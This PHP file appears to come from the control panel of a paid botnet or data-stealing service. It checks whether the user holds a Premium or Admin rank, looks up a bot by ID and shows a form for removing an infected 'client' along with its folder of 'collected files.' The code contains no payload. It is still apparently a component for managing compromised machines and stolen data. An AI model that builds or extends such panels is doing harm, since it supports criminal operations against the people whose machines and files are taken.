
<?php
    @session_start();
    include_once 'includes/functions.php';
    include_once 'includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');

    $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
    $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();

    if($getRank != "Premium"){
        if($getRank != "Admin"){
          header('Location: dashboard.php');
          die();
        }
      }

     

     if (isset($_POST['id']) && !empty($_POST['id'])){

        if($banned == 0){

          $get = pdoQuery($db, "SELECT * FROM `bots` WHERE `botID`=?", [htmlspecialchars($_POST['id'])]);
          $results = $get->fetchAll(PDO::FETCH_ASSOC);

          foreach($results as $result){
              $botID = htmlspecialchars($result['botID']);
              $folder = htmlspecialchars($result['folder']);

              echo "<div class='d-flex justify-content-center bd-highlight mb-2 text-muted text-left'>
              <p style='color: #eb4034;'>Warning: If you remove a client then all collected files will be permanently terminated!</p>
              </div>";

              echo "<form method='POST'><div class='d-flex justify-content-center bd-highlight mb-2 text-muted text-left'>
              <button type='submit' class='btn btn-outline-danger btn-sm m-0 waves-effect mr-2' name='removeClient' value='$botID' style='width: 100%;'><i class='fas fa-user-minus mr-2'></i> Remove Client</button>
              <input type='hidden' name='botFolder' value='$folder' />
              </div></form>";

          }
        }else{
          echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-lightred'>
          <div class='p-2 bd-highlight'>You are banned. :'D</div>
          </div>";
        }
     }
?>